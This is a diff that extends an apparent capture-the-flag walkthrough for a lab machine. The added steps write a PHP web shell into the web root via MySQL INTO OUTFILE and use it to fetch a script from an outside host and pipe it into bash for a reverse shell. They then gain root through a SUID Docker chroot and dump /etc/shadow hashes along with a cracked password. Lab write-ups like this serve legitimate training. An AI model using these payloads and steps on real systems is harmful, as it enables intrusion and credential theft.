@@ -153,7 +153,7 @@ if($connection == false){
 }
 ?>
 ```
-- Try to login to the database from inside the container.
+- Try to log in to the database from inside the container.
 ```bash
 $ mysql -u admin -p -h 192.168.100.1
 Enter password: !123SecureAdminDashboard321!
@@ -199,4 +199,94 @@ select * from users;
 | gurag    | AAAA            |
 +----------+-----------------+
 ```
+- Now, Make a new file named `shell.php` by embedding the PHP cmd script inside it using MySQL.
 
+```bash
+mysql> select '<?php $cmd=$_GET["cmd"];system($cmd);?>' INTO OUTFILE '/var/www/html/shell.php';
+```
+
+- Next, we will fetch the file from inside the box using curl cmd with an encoded URL. Make sure to set up a listener.
+
+```bash
+URL: curl '192.168.100.1:8080/shell.php?cmd=curl http://<IP>:8081/shell.php | bash &
+
+Encoded URL: curl '192.168.100.1:8080/shell.php?cmd=curl%20http://10.50.109.29:8081/shell.sh%20%7C%20bash%20&'%0A
+```
+- Successfully got the shell.
+```bash
+www-data@ip-10-200-112-33:/var/www$ whoami
+www-data
+```
+- On running **Linpeas** I found docker set to SUID bit. Go to GTFO bins and escalate privileges to root.
+``` bash
+$ ./docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+<docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+Unable to find image 'alpine:latest' locally
+```
+- Didn't work let's list the docker images available.
+```bash
+$ docker images
+docker images
+REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
+<none>              <none>              cb1b741122e8        2 years ago         995MB
+<none>              <none>              b711fc810515        2 years ago         993MB
+<none>              <none>              591bb8cd4ef6        2 years ago         993MB
+<none>              <none>              88d15ba62bf4        2 years ago         993MB
+ubuntu              18.04               56def654ec22        2 years ago         63.2MB
+```
+- Let's go with Ubuntu.
+```bash
+n$ ./docker run -v /:/mnt --rm -it ubuntu:18.04 chroot /mnt sh
+< run -v /:/mnt --rm -it ubuntu:18.04 chroot /mnt sh
+# whoami
+whoami
+root
+```
+- Submit the flag.
+- Next, is to stabilize our shell, for this let's enumerate the shadow file.
+```bash
+# cat /etc/shadow   
+cat /etc/shadow
+root:$6$TvYo6Q8EXPuYD8w0$Yc.Ufe3ffMwRJLNroJuMvf5/Telga69RdVEvgWBC.FN5rs9vO0NeoKex4jIaxCyWNPTDtYfxWn.EM4OLxjndR1:18605:0:99999:7:::
+daemon:*:18512:0:99999:7:::
+bin:*:18512:0:99999:7:::
+sys:*:18512:0:99999:7:::
+sync:*:18512:0:99999:7:::
+games:*:18512:0:99999:7:::
+man:*:18512:0:99999:7:::
+lp:*:18512:0:99999:7:::
+mail:*:18512:0:99999:7:::
+news:*:18512:0:99999:7:::
+uucp:*:18512:0:99999:7:::
+proxy:*:18512:0:99999:7:::
+www-data:*:18512:0:99999:7:::
+backup:*:18512:0:99999:7:::
+list:*:18512:0:99999:7:::
+irc:*:18512:0:99999:7:::
+gnats:*:18512:0:99999:7:::
+nobody:*:18512:0:99999:7:::
+systemd-network:*:18512:0:99999:7:::
+systemd-resolve:*:18512:0:99999:7:::
+systemd-timesync:*:18512:0:99999:7:::
+messagebus:*:18512:0:99999:7:::
+syslog:*:18512:0:99999:7:::
+_apt:*:18512:0:99999:7:::
+tss:*:18512:0:99999:7:::
+uuidd:*:18512:0:99999:7:::
+tcpdump:*:18512:0:99999:7:::
+sshd:*:18512:0:99999:7:::
+landscape:*:18512:0:99999:7:::
+pollinate:*:18512:0:99999:7:::
+ec2-instance-connect:!:18512:0:99999:7:::
+systemd-coredump:!!:18566::::::
+ubuntu:!$6$6/mlN/Q.1gopcuhc$7ymOCjV3RETFUl6GaNbau9MdEGS6NgeXLM.CDcuS5gNj2oIQLpRLzxFuAwG0dGcLk1NX70EVzUUKyUQOezaf0.:18601:0:99999:7:::
+lxd:!:18566::::::
+mysql:!:18566:0:99999:7:::
+dnsmasq:*:18566:0:99999:7:::
+linux-admin:$6$Zs4KmlUsMiwVLy2y$V8S5G3q7tpBMZip8Iv/H6i5ctHVFf6.fS.HXBw9Kyv96Qbc2ZHzHlYHkaHm8A5toyMA3J53JU.dc6ZCjRxhjV1:18570:0:99999:7:::
+```
+- Hash cracked for user `linux-admin`.
+```bash
+user- linux-admin
+pass- linuxrulez
+```
